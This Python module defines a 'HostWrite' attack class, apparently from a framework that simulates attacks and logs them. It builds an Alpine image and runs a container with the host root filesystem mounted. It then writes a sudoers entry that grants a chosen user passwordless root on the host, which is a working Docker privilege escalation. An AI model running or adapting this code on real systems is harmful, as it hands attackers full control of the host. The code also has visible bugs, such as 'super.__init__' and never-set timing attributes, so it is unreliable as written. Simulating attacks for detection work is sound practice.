import subprocess, time
from ..attack import Attack

files = {
    "docker_file": """
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME $WORKDIR
WORKDIR $WORKDIR""",
         }

class HostWrite(Attack):
    def __init__(self, trigger_time=5, workdir="privesc", image="priv_container", container="ESCAPE_PRIVESC", username="testuser"):
        self.trigger_time = trigger_time
        self.workdir = workdir
        self.image = image
        self.container = container
        self.username = username
        dockerfile = open("Dockerfile", "w+")
        dockerfile.write("FROM alpine\n")
        dockerfile.write("ENV WORKDIR /{}\n".format(workdir))
        dockerfile.write("RUN mkdir -p $WORKDIR\n")
        dockerfile.write("VOLUME $WORKDIR\n")
        dockerfile.write("WORKDIR $WORKDIR\n")
        dockerfile.close()
        subprocess.run(["docker", "build", "-t", image, "."])
        super.__init__("host_exec")
    
    def execute(self, in_sec=0, kill_in_sec=0):
        # time.sleep(in_sec)
        subprocess.run('docker run --name {} -v /:/{} -dit {} /bin/sh'.format(self.container, self.workdir, self.image).split())
        # time.sleep(self.trigger_time)
        
        subprocess.run(['docker', 'exec', self.container, 'sh', '-c', 'echo "{} ALL=(ALL) NOPASSWD: ALL" > /{}/etc/sudoers.d/010_{}-nopasswd'.format(self.username, self.workdir, self.username)])
        # time.sleep(kill_in_sec)

    def get_log_start(self):
        return f"[{self.time_start}][{self.name}][{self.container}] Attack Started"
    
    def get_log_end(self):
        self.finalize()
        return f"[{self.time_end}][{self.name}][{self.container}] Attack Ended"

